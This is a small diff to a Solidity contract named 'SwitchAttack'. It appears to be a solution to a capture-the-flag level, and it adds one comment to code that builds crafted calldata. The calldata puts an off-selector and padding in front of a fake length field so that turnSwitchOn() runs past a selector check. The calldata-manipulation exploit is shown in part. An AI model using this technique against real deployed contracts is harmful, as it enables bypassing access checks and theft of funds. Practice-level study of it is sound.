@@ -50,6 +50,7 @@ contract SwitchAttack {
         bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
         // This fills the 28-byte gap between the offSelector and the dataLength
         bytes memory extraPadding = new bytes(28);
+        //data length(the decoder will reach here and excute the turnSwitchOn function)
         bytes32 dataLength = bytes32(uint256(4));
         //132-164 excute
         bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
